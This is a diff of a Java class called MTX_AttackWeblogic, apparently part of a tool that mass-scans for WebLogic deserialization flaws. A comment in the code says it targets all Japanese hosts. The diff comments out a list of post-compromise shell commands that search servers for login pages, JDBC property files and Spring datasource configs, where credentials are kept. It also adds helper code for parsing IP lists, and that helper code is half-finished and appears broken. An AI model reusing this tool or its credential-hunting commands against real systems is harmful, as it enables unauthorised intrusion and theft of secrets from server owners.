@@ -180,11 +180,10 @@ public class MTX_AttackWeblogic extends InfoLog
 						"所有war"
 						,"find . -name *.war",
 						"所有ear"
-						,"find . -name *.ear",
-						
-						"所有文件日期"
+						,"find . -name *.ear"
+						/*
+						,"所有文件日期"
 						,"ls -la -R .",
-						
 						
 						"当前目录下所有登录文件",
 						"find . -name   *ogin.jsp",
@@ -197,7 +196,7 @@ public class MTX_AttackWeblogic extends InfoLog
 						"当前目录下所有jdbc.pro*文件",
 						"find . -name  jdbc.pro*",
 						"当前目录下所有spring-datasource.xml文件",
-						"find . -name  spring-datasource.xml"
+						"find . -name  spring-datasource.xml"*/
 			 };
 		}
 		 for(int i = 0, j = a.length; i < j; i+=2)
@@ -510,6 +509,39 @@ public class MTX_AttackWeblogic extends InfoLog
         }
 	   }
 	}
+	/*
+	 * 单个ip处理
+	 * */
+	public static String getOneIp(String s)
+	{
+		;
+		return s;
+	}
+	
+	public static String getIps(String s)
+	{
+		int i = s.indexOf('-'), j = s.indexOf('/');
+		if(-1 == i || -1 == j)return s;
+		StringBuffer buf = new StringBuffer(); 
+		String []a = s.split(";");
+		for(int x = 0, y = a.length; x < y; x++)
+		{
+			i = a[x].indexOf('-');
+			j = a[x].indexOf('/');
+			if(-1 == i && -1 == j)
+			{
+				buf.append(a[x]).append(";");
+			}
+			else
+			{
+				a[x] = getOneIp(a[x]);
+			}
+		}
+		if(0 == buf.length())return s;
+		
+		return buf.toString();
+	}
+	
 	/**
 	 * ip:port;
 	 * 测试所有日本主机的反序列化漏洞
@@ -521,7 +553,7 @@ public class MTX_AttackWeblogic extends InfoLog
 		final MTX_AttackWeblogic ma = new MTX_AttackWeblogic();
 		if(0 < args.length)
 		{
-			String []a = args[0].split(";"), ab;
+			String []a = getIps(args[0]).split(";"), ab;
 			for(int i = 0, j = a.length; i < j; i++)
 			{
 				ab = a[i].split(":");
